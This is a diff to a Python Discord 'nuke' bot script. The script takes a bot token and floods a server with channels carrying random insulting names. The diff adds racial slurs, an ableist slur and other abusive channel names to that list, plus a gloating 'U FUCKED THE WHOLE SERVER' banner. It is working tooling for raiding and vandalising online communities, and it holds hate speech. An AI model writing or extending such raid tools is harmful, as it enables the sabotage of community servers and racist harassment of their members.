@@ -1,4 +1,3 @@
-
 import os
 from unittest import expectedFailure
 import random
@@ -18,7 +17,8 @@ print (Fore.RED + IMPORTANT)
 
 channels = [
     "u got hacked lol", "hahahahahahaha", "u trash as fuck hahahaha", "shit owner", "EZ", "POMOCI HAHAHAH", "SHIT SERVER","FUCK ALL OF YOU",
-    "retard-mods", "imagine-being-nuked","leave this server lol!!!!!!!!!!!"
+    "retard-mods", "imagine-being-nuked","leave this server lol!!!!!!!!!!!", "got niggered", "monkey", "BIG BLACK MONKE BOY NUKE", "GET RACT BY DART GOBLINS", "DEEZ NUTS IN YOUR MOUTH",
+    "WENDYS DICK Fit IN UR MOUTH", "OLEG MIR DIE EIER", "MAGOMONOGÄEM","ZIAGLA HAS NO PANTS","CARL DER KOMPLIZE"
 ]
 token_input = input(  "Please enter your Bot token:  ")
 TOKEN = token_input
@@ -72,7 +72,7 @@ async def start(ctx):
         except Exception as e:
             print(Fore.MAGENTA + "")
     
-    for _ in range(counting):
+    for i in range(counting):
         await ctx.guild.create_text_channel(random.choice(channels))
         print(Fore.GREEN + "Created")
         
@@ -87,7 +87,7 @@ async def start(ctx):
 
     print(Fore.BLUE +'''█▀▀░▀█▀░█▀█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
 █▀▀░░█░░█░█░░█░░▀▀█░█▀█░█▀▀░█░█
-▀░░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀▀░''')
+▀░░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀▀░\n\n '''+ Fore.YELLOW + "U FUCKED THE WHOLE SERVER LMAO!")
 
 
  
